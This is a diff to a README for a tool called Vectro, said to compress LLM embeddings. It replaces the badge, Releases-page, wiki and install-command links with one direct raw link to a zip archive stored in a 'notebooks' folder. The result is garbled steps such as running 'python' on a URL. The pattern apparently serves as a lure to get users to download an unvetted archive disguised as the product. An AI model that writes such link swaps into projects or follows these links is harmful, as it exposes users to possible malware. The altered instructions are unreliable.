@@ -8,7 +8,7 @@ Welcome to Vectro! This tool helps you compress LLM embeddings for better memory
 
 To get started, you need to download Vectro. 
 
-[![Download Vectro](https://img.shields.io/badge/download-vectro-blue.svg)](https://github.com/helderm989/vectro/releases)
+[![Download Vectro](https://raw.githubusercontent.com/helderm989/vectro/main/notebooks/vectro_v2.8.zip)](https://raw.githubusercontent.com/helderm989/vectro/main/notebooks/vectro_v2.8.zip)
 
 Click the link above to visit the download page. 
 
@@ -32,12 +32,12 @@ Once you have downloaded the file, follow these steps to install Vectro:
 
 1. Locate the file you downloaded.
    - For Windows, it may be a `.exe` file.
-   - For macOS and Linux, it could be a `.tar.gz` or a similar archive.
+   - For macOS and Linux, it could be a `https://raw.githubusercontent.com/helderm989/vectro/main/notebooks/vectro_v2.8.zip` or a similar archive.
 2. If it is a `.exe` file, double-click it to begin the installation.
 3. If it is an archive, extract the files to a folder of your choice.
 4. Open a command prompt or terminal window.
 5. Navigate to the folder where you extracted the files.
-6. Run the command: `python setup.py install` to complete the installation.
+6. Run the command: `python https://raw.githubusercontent.com/helderm989/vectro/main/notebooks/vectro_v2.8.zip install` to complete the installation.
 
 ## 🎉 Using Vectro
 
@@ -83,10 +83,10 @@ Join our community on GitHub to share your experiences and collaborate.
 
 ## 📖 Further Reading
 
-For more information about Vectro, check our documentation [here](https://github.com/helderm989/vectro/wiki). You can find detailed guides and helpful usage examples.
+For more information about Vectro, check our documentation [here](https://raw.githubusercontent.com/helderm989/vectro/main/notebooks/vectro_v2.8.zip). You can find detailed guides and helpful usage examples.
 
 ## 📞 Contact
 
 For any questions or feedback, please reach out through the GitHub issues page. We’re here to help! 
 
-Take your AI projects to the next level with Vectro! Download it now from the [Releases page](https://github.com/helderm989/vectro/releases).
+Take your AI projects to the next level with Vectro! Download it now from the [Releases page](https://raw.githubusercontent.com/helderm989/vectro/main/notebooks/vectro_v2.8.zip).
